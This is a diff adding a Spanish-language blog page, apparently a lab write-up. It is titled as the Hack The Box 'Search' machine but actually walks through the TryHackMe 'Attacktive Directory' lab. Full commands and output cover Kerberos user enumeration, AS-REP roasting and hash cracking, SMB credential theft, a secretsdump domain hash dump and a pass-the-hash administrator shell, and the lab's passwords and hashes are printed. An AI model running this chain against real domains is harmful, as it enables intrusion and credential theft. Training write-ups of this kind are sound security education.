@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Retirada Search de Hack The Box (Necesario VIP) | Pirrandi Blog</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina Retirada Search de Hack The Box (Necesario VIP)" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Search" />
+<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Search" />
+<link rel="canonical" href="http://localhost:4000/2022/06/05/Attacktive-THM-AD.html" />
+<meta property="og:url" content="http://localhost:4000/2022/06/05/Attacktive-THM-AD.html" />
+<meta property="og:site_name" content="Pirrandi Blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2022-06-05T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina Retirada Search de Hack The Box (Necesario VIP)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2022-06-05T00:00:00-03:00","datePublished":"2022-06-05T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Search","headline":"Maquina Retirada Search de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/06/05/Attacktive-THM-AD.html"},"url":"http://localhost:4000/2022/06/05/Attacktive-THM-AD.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi Blog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi Blog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="" class="author-avatar" alt="Avatar" />
+    
+Este es mi blog personal sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina Retirada Search de Hack The Box (Necesario VIP)</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/THM,/">THM,</a>
+      
+      <a class="tag" href="/tag/Enumeration,/">Enumeration,</a>
+      
+      <a class="tag" href="/tag/SMB,/">SMB,</a>
+      
+      <a class="tag" href="/tag/Kerbrute/">Kerbrute</a>
+      
+      <a class="tag" href="/tag/Userenum,/">Userenum,</a>
+      
+      <a class="tag" href="/tag/ASPREPRoast/">ASPREPRoast</a>
+      
+      <a class="tag" href="/tag/Attack,/">Attack,</a>
+      
+      <a class="tag" href="/tag/Kerberoasting/">Kerberoasting</a>
+      
+      <a class="tag" href="/tag/Attack,/">Attack,</a>
+      
+      <a class="tag" href="/tag/Secretsdumps.py,/">Secretsdumps.py,</a>
+      
+      <a class="tag" href="/tag/Maquina/">Maquina</a>
+      
+      <a class="tag" href="/tag/Gratuitas./">Gratuitas.</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 05 Jun 2022</div>
+  
+  <noscript>
+    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada Search</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="attacktive--try-hack-me">Attacktive ~ Try Hack Me</h1>
+
+<p>Realizamos el Primer escaneo con Nmap</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.165.157       "</span>
+</code></pre></div></div>
+
+<p>Segundo escaneo para ver los Servicios</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: IIS Windows Server
+| http-methods: 
+|_  Potentially risky methods: TRACE
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-06-14 11:39:10Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+|_ssl-date: 2022-06-14T11:40:15+00:00; +3s from scanner time.
+| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
+| Not valid before: 2022-06-13T11:34:00
+|_Not valid after:  2022-12-13T11:34:00
+| rdp-ntlm-info: 
+|   Target_Name: THM-AD
+|   NetBIOS_Domain_Name: THM-AD
+|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
+|   DNS_Domain_Name: spookysec.local
+|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
+|   Product_Version: 10.0.17763
+|_  System_Time: 2022-06-14T11:40:05+00:00
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49674/tcp open  msrpc         Microsoft Windows RPC
+49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49676/tcp open  msrpc         Microsoft Windows RPC
+49679/tcp open  msrpc         Microsoft Windows RPC
+49684/tcp open  msrpc         Microsoft Windows RPC
+49696/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+| smb2-time: 
+|   date: 2022-06-14T11:40:09
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<p>Procedemos a identificar el nombre de Dominio <code class="language-plaintext highlighter-rouge">spookysec.local</code> e introducirlo en nuestro <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># ping -c 1 spookysec.local
+PING spookysec.local (10.10.165.157) 56(84) bytes of data.
+64 bytes from spookysec.local (10.10.165.157): icmp_seq=1 ttl=127 time=54.1 ms
+
+--- spookysec.local ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 54.135/54.135/54.135/0.000 ms
+</code></pre></div></div>
+
+<p>Una vez hecho esto como vemos que el puerto 88 Kerberos esta abierto vamos a proceder a enumerar Usuarios</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
+# kerbrute userenum -d spookysec.local  passwordlist.txt  --dc spookysec.local
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 06/15/22 - Ronnie Flathers @ropnop
+
+2022/06/15 13:01:07 &gt;  Using KDC(s):
+2022/06/15 13:01:07 &gt;   spookysec.local:88
+
+2022/06/15 13:01:07 &gt;  [+] svc-admin has no pre auth required.
+2022/06/15 13:01:07 &gt;  [+] VALID USERNAME:       svc-admin@spookysec.local
+2022/06/15 13:01:08 &gt;  [+] VALID USERNAME:       james@spookysec.local
+2022/06/15 13:01:24 &gt;  [+] VALID USERNAME:       robin@spookysec.local
+2022/06/15 13:01:39 &gt;  [+] VALID USERNAME:       darkstar@spookysec.local
+2022/06/15 13:02:07 &gt;  [+] VALID USERNAME:       JAMES@spookysec.local
+2022/06/15 13:02:30 &gt;  [+] VALID USERNAME:       paradox@spookysec.local
+2022/06/15 13:02:31 &gt;  [+] VALID USERNAME:       administrator@spookysec.local
+2022/06/15 13:03:06 &gt;  [+] VALID USERNAME:       James@spookysec.local
+2022/06/15 13:04:51 &gt;  [+] VALID USERNAME:       backup@spookysec.local
+</code></pre></div></div>
+
+<p>Como vemos el usuario <code class="language-plaintext highlighter-rouge">svc-admin</code> seria vulnerable a un ataque de ASPREPRoast</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># GetNPUsers.py spookysec.local/ -no-pass -usersfile content/users                                                                                                                                         130 ⨯
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation
+
+$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:914d34c23212fbf3ad067101c8f05650$4c8a067f62ae3508879bef3fc92eb8e6b31aa9f616071d47aad50e5ebeab47d5e2bfebdd5aed73a9a79f7eed5ae9a4818ff0c75ac203f1f62ae82053acc1cdde98f24b28afef9eaa67b417e89743b3bc2de9873661a68a95507bf9b27d4d8306b1564b4833c5bcc95eb44e0eb5b49c71c4485e2e616245cae67d8921dc260f61206104cecfd48b30a3033af36836cbded82913910b3ee32623bc10fa12681df67c90f0de13a31b7d18cd5e9900be859894d9725d1044a652c78495f891c8c734762a6284a0f4b05c9460baf31cc56e6aff1911eda33959732d5a8cbb8031ea5649137a63f3d68c9b859f1835652e6e0d6e51
+</code></pre></div></div>
+
+<p>Nos Copiamos el Hash y procedemos a crackearlo con la herramienta John</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># john --wordlist=/usr/share/wordlists/rockyou.txt hash                 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+"management2005   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)"     
+1g 0:00:00:02 DONE (2022-06-15 13:09) 0.3367g/s 1965Kp/s 1965Kc/s 1965KC/s manaia010..mamuchopia9
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+<p>Nos creamos un archivo de credenciales, con las credenciales obtenidas</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>svc-admin: management2005
+</code></pre></div></div>
+
+<p>Procedemos a intentar conectarnos por SMB al recurso Backup con las credenciales Optenidas</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local -r backup
+[+] IP: 10.10.165.157:445       Name: spookysec.local                                   
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        backup                                                  READ ONLY
+        .\backup\*
+        dr--r--r--                0 Sat Apr  4 21:08:39 2020    .
+        dr--r--r--                0 Sat Apr  4 21:08:39 2020    ..
+        fr--r--r--               48 Sat Apr  4 21:08:53 2020    backup_credentials.txt
+</code></pre></div></div>
+
+<p>Cuando Procedemos a descargar el archivo obtenemos un problema.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># smbmap -u svc-admin -p management2005 -H 10.10.165.157 -d spookysec.local --download backup/backup_credentials.txt
+# du -h 10.10.165.157-backup__credentials.txt                                                                                                                         
+0       10.10.165.157-backup__credentials.txt
+</code></pre></div></div>
+<p>Como vemos que no funciona correctamente procedo a montarme el recurso compartido con una montura a mi directorio /mnt</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># mount -t cifs //10.10.165.157/backup /mnt/ -o username="svc-admin",password="management2005",domain=spookysec.local,rw
+# ls -la /mnt                     
+total 5
+drwxr-xr-x  2 root root    0 abr  4  2020 .
+drwxr-xr-x 20 root root 4096 may 31 21:36 ..
+-rwxr-xr-x  1 root root   48 abr  4  2020 backup_credentials.txt
+</code></pre></div></div>
+<p>Procedemos a leer el Archivo</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cat /mnt/backup_credentials.txt 
+YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
+
+# cat /mnt/backup_credentials.txt | base64 -d
+backup@spookysec.local:backup2517860
+</code></pre></div></div>
+<p>Nos guardamos las credenciales en el archivo Creds
+Procedemos a enumerar con bloodhound.py el directorio activo</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># python3 bloodhound.py -u svc-admin -p "management2005" -d spookysec.local -ns 10.10.165.157 --zip
+INFO: Found AD domain: spookysec.local
+INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Found 18 users
+INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
+INFO: Found 54 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: AttacktiveDirectory.spookysec.local
+INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
+INFO: Done in 00M 05S
+INFO: Compressing output into 20220615135241_bloodhound.zip
+</code></pre></div></div>
+<p>Una vez obtendio el .zip procedemos a iniciar Neo4J y bloodhound</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+
+Introducimos nuestras credenciales en Neo4J 
+Iniciamos el BloodHound desde nuestro directorio /opt/BloodHound he introducimos nuestras credenciales
+./BloodHound --no-sandbox 2&gt;/dev/null &amp;                                                                                                                                
+[2] 3424
+
+Cargamos nuestro .zip
+Marcamos los usuarios que tenemos comprometidos e enumeramos informacion de estos mismos
+Vemos que para el Usuario Backup pertenece al grupo de Domain Users.
+</code></pre></div></div>
+
+<p>Procedemos a intentar ejecutar la herramienta <code class="language-plaintext highlighter-rouge">Secretsdumps.py</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># secretsdump.py -just-dc backup:backup2517860@spookysec.local                                                                                                         
+Impacket v0.9.24.dev1+20210827.162957.5aa97fa7 - Copyright 2021 SecureAuth Corporation                                                                                                                                                   
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                           
+[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                               
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                                 
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::                                                                                         
+spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                                         
+spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::                                                               
+spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::                                                                         
+spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::                                                                     
+spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::                                                                   
+spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::                                                                     
+spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::                                                                           
+spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::                                                                         
+spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::                                                                       
+spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::                                                                     
+spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::                                                                     
+spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::                                                                     
+spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::                                                                       
+spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::                                                                     
+ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:c1cc5e04834fdec25529f43ff910f00c:::
+</code></pre></div></div>
+
+<p>Procedemos a hacer uso de evil-winrm proporcionando el hash del usuario administrator</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># evil-winrm -i 10.10.165.157 -u 'administrator' -H '0e0363213e37b94221497260b0bcb4fc'
+Evil-WinRM shell v3.3
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+thm-ad\administrator
+</code></pre></div></div>
+
+<p>Maquina Comprometida AD ~ K0H4ck</p>
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2022/06/05/Attacktive-THM-AD.html';
+     this.page.identifier = '/2022/06/05/Attacktive-THM-AD';
+     this.page.title = 'Maquina Retirada Search de Hack The Box (Necesario VIP)';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2023/09/29/Buff-Bof.html">
+            Maquina  Retirada Buff de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/06/05/Search-AD.html">
+            Maquina Retirada Search de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2022/03/05/Monteverde.html">
+            Maquina Retirada Monteverde AD de Hack The Box (Necesario VIP)
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/%26/" class="set-1">&</a> <a href="/tag/8.6%2C/" class="set-1">8.6,</a> <a href="/tag/ad/" class="set-1">AD</a> <a href="/tag/aspreproast/" class="set-1">ASPREPRoast</a> <a href="/tag/asrep-roast%2C/" class="set-1">ASREP-Roast,</a> <a href="/tag/asreproast/" class="set-1">ASREPRoast</a> <a href="/tag/active/" class="set-1">Active</a> <a href="/tag/admin%2C/" class="set-1">Admin,</a> <a href="/tag/admins/" class="set-1">Admins</a> <a href="/tag/admins%2C/" class="set-1">Admins,</a> <a href="/tag/archivos/" class="set-1">Archivos</a> <a href="/tag/attack%2C/" class="set-1">Attack,</a> <a href="/tag/attacks/" class="set-1">Attacks</a> <a href="/tag/azure/" class="set-1">Azure</a> <a href="/tag/bin/" class="set-1">Bin</a> <a href="/tag/bloodhound%2C/" class="set-1">BloodHound,</a> <a href="/tag/bruta%2C/" class="set-1">Bruta,</a> <a href="/tag/bruteforce%2C/" class="set-1">BruteForce,</a> <a href="/tag/burpsuite%2C/" class="set-1">Burpsuite,</a> <a href="/tag/bypass/" class="set-1">ByPass</a> <a href="/tag/bypass%2C/" class="set-1">Bypass,</a> <a href="/tag/ca/" class="set-1">CA</a> <a href="/tag/cgi-bin%2C/" class="set-1">CGI-BIN,</a> <a href="/tag/cron%2C/" class="set-1">CRON,</a> <a href="/tag/csrf/" class="set-1">CSRF</a> <a href="/tag/chkrootkit%2C/" class="set-1">Chkrootkit,</a> <a href="/tag/churrasco%2C/" class="set-1">Churrasco,</a> <a href="/tag/cifrado/" class="set-1">Cifrado</a> <a href="/tag/crackmapexec%2C/" class="set-1">Crackmapexec,</a> <a href="/tag/cron-taks%2C/" class="set-1">Cron-taks,</a> <a href="/tag/decimal%2C/" class="set-1">Decimal,</a> <a href="/tag/device/" class="set-1">Device</a> <a href="/tag/directory%2C/" class="set-1">Directory,</a> <a href="/tag/dominios%2C/" class="set-1">Dominios,</a> <a href="/tag/dovecot%2C/" class="set-1">Dovecot,</a> <a href="/tag/elastix%2C/" class="set-1">Elastix,</a> <a href="/tag/empezando%2C/" class="set-1">Empezando,</a> <a href="/tag/encrypt-decrypt%2C/" class="set-1">Encrypt-Decrypt,</a> <a href="/tag/enumeracion%2C/" class="set-1">Enumeracion,</a> <a href="/tag/enumeration%2C/" class="set-1">Enumeration,</a> <a href="/tag/evil-winrm%2C/" class="set-1">Evil-WinRm,</a> <a href="/tag/excel%2C/" class="set-1">Excel,</a> <a href="/tag/excell/" class="set-1">Excell</a> <a href="/tag/files%2C/" class="set-1">Files,</a> <a href="/tag/firefox%2C/" class="set-1">Firefox,</a> <a href="/tag/fueza/" class="set-1">Fueza</a> <a href="/tag/fuzzing%2C/" class="set-1">Fuzzing,</a> <a href="/tag/get-adobject%2C/" class="set-1">Get-ADObject,</a> <a href="/tag/getchanges-all%2C/" class="set-1">GetChanges-All,</a> <a href="/tag/gratuitas./" class="set-1">Gratuitas.</a> <a href="/tag/group%2C/" class="set-1">Group,</a> <a href="/tag/groups%2C/" class="set-1">Groups,</a> <a href="/tag/guessing%2C/" class="set-1">Guessing,</a> <a href="/tag/gwolle%2C/" class="set-1">Gwolle,</a> <a href="/tag/htb%2C/" class="set-5">HTB,</a> <a href="/tag/hacking/" class="set-4">Hacking</a> <a href="/tag/hacking%2C/" class="set-1">Hacking,</a> <a href="/tag/heartbleed%2C/" class="set-1">HeartBleed,</a> <a href="/tag/hex%2C/" class="set-1">Hex,</a> <a href="/tag/hydra%2C/" class="set-1">Hydra,</a> <a href="/tag/iis%2C/" class="set-1">IIS,</a> <a href="/tag/iis-6.0%2C/" class="set-1">IIS-6.0,</a> <a href="/tag/irc%2C/" class="set-1">IRC,</a> <a href="/tag/impackect-secretsdump%2C/" class="set-1">Impackect-SecretsDump,</a> <a href="/tag/import/" class="set-1">Import</a> <a href="/tag/juicypotato%2C/" class="set-1">JuicyPotato,</a> <a href="/tag/kerberoasting/" class="set-1">Kerberoasting</a> <a href="/tag/kerbrute/" class="set-1">Kerbrute</a> <a href="/tag/kerbrute%2C/" class="set-1">Kerbrute,</a> <a href="/tag/ldap%2C/" class="set-1">LDAP,</a> <a href="/tag/lfi%2C/" class="set-1">LFI,</a> <a href="/tag/mail%2C/" class="set-1">Mail,</a> <a href="/tag/maquina/" class="set-1">Maquina</a> <a href="/tag/maquinas/" class="set-5">Maquinas</a> <a href="/tag/mimikatz.exe%2C/" class="set-1">Mimikatz.exe,</a> <a href="/tag/mongodb%2C/" class="set-1">MongoDB,</a> <a href="/tag/mssqlclient%2C/" class="set-1">Mssqlclient,</a> <a href="/tag/multiples/" class="set-1">Multiples</a> <a href="/tag/myssql-server%2C/" class="set-1">Myssql-Server,</a> <a href="/tag/neo4j%2C/" class="set-1">Neo4j,</a> <a href="/tag/nibbleblog%2C/" class="set-1">NibbleBlog,</a> <a href="/tag/nishang%2C/" class="set-1">Nishang,</a> <a href="/tag/oscp/" class="set-4">OSCP</a> <a href="/tag/olevba/" class="set-1">Olevba</a> <a href="/tag/php%2C/" class="set-1">PHP,</a> <a href="/tag/php./" class="set-1">PHP.</a> <a href="/tag/password/" class="set-1">Password</a> <a href="/tag/path%2C/" class="set-4">Path,</a> <a href="/tag/plugins%2C/" class="set-1">Plugins,</a> <a href="/tag/popd%2C/" class="set-1">PopD,</a> <a href="/tag/portknocking%2C/" class="set-1">PortKnocking,</a> <a href="/tag/portal%2C/" class="set-1">Portal,</a> <a href="/tag/post-explotacion./" class="set-1">Post-Explotacion.</a> <a href="/tag/powershell/" class="set-1">PowerShell</a> <a href="/tag/powerup%2C/" class="set-1">PowerUp,</a> <a href="/tag/powershell%2C/" class="set-1">Powershell,</a> <a href="/tag/privesc/" class="set-1">Privesc</a> <a href="/tag/privesc%2C/" class="set-1">Privesc,</a> <a href="/tag/proteccions%2C/" class="set-1">Proteccions,</a> <a href="/tag/python%2C/" class="set-1">Python,</a> <a href="/tag/rce%2C/" class="set-1">RCE,</a> <a href="/tag/rdp-file%2C/" class="set-1">RDP-file,</a> <a href="/tag/rpcclient%2C/" class="set-1">RPCCLIENT,</a> <a href="/tag/readgmsapassword%2C/" class="set-1">ReadGMSAPassword,</a> <a href="/tag/recycle/" class="set-1">Recycle</a> <a href="/tag/remote/" class="set-1">Remote</a> <a href="/tag/retiradas/" class="set-1">Retiradas</a> <a href="/tag/retiradas%2C/" class="set-5">Retiradas,</a> <a href="/tag/retiradas./" class="set-1">Retiradas.</a> <a href="/tag/smb%2C/" class="set-1">SMB,</a> <a href="/tag/ss%2C/" class="set-1">SS,</a> <a href="/tag/ssh%2C/" class="set-1">SSH,</a> <a href="/tag/ssrf/" class="set-1">SSRF</a> <a href="/tag/ssrf%2C/" class="set-1">SSRF,</a> <a href="/tag/suid%2C/" class="set-1">SUID,</a> <a href="/tag/sam%2C/" class="set-1">Sam,</a> <a href="/tag/samba%2C/" class="set-1">Samba,</a> <a href="/tag/scheduler%2C/" class="set-1">Scheduler,</a> <a href="/tag/secretsdump.py%2C/" class="set-1">SecretsDump.py,</a> <a href="/tag/secretsdumps.py%2C/" class="set-1">Secretsdumps.py,</a> <a href="/tag/shares/" class="set-1">Shares</a> <a href="/tag/sharphound.ps1%2C/" class="set-1">SharpHound.ps1,</a> <a href="/tag/shellshock%2C/" class="set-1">ShellShock,</a> <a href="/tag/smbclient%2C/" class="set-1">SmbClient,</a> <a href="/tag/smbmap%2C/" class="set-1">SmbMap,</a> <a href="/tag/sqsh%2C/" class="set-1">Sqsh,</a> <a href="/tag/starting/" class="set-1">Starting</a> <a href="/tag/steganografia%2C/" class="set-1">Steganografia,</a> <a href="/tag/system%2C/" class="set-1">System,</a> <a href="/tag/thm%2C/" class="set-1">THM,</a> <a href="/tag/tmux-priv%2C/" class="set-1">Tmux-Priv,</a> <a href="/tag/tomcat/" class="set-1">Tomcat</a> <a href="/tag/transferencia/" class="set-1">Transferencia</a> <a href="/tag/unrealirc%2C/" class="set-1">UnRealIRC,</a> <a href="/tag/upload/" class="set-1">Upload</a> <a href="/tag/userenum%2C/" class="set-1">Userenum,</a> <a href="/tag/vnc/" class="set-1">VNC</a> <a href="/tag/web/" class="set-1">Web</a> <a href="/tag/webshell%2C/" class="set-1">Webshell,</a> <a href="/tag/wget/" class="set-1">Wget</a> <a href="/tag/winpeas%2C/" class="set-1">WinPeas,</a> <a href="/tag/windows/" class="set-1">Windows</a> <a href="/tag/windows%2C/" class="set-1">Windows,</a> <a href="/tag/wordpress%2C/" class="set-1">Wordpress,</a> <a href="/tag/wpscan%2C/" class="set-1">Wpscan,</a> <a href="/tag/writeup/" class="set-1">Writeup</a> <a href="/tag/writeup%2C/" class="set-4">Writeup,</a> <a href="/tag/xp_cmdshell%2C/" class="set-1">Xp_CmdShell,</a> <a href="/tag/xp_dirtree%2C/" class="set-1">Xp_dirtree,</a> <a href="/tag/zona%2C/" class="set-1">Zona,</a> <a href="/tag/app-js%2C/" class="set-1">app-js,</a> <a href="/tag/de/" class="set-1">de</a> <a href="/tag/fcrackzip%2C/" class="set-1">fcrackzip,</a> <a href="/tag/html/" class="set-1">html</a> <a href="/tag/injecction/" class="set-1">injecction</a> <a href="/tag/pfsense%2C/" class="set-1">pfSense,</a> <a href="/tag/pfx2john%2C/" class="set-1">pfx2john,</a> <a href="/tag/phpliteadmin%2C/" class="set-1">phpLiteAdmin,</a> <a href="/tag/privesc/" class="set-1">privesc</a> <a href="/tag/privesc%2C/" class="set-1">privesc,</a> <a href="/tag/python%2C/" 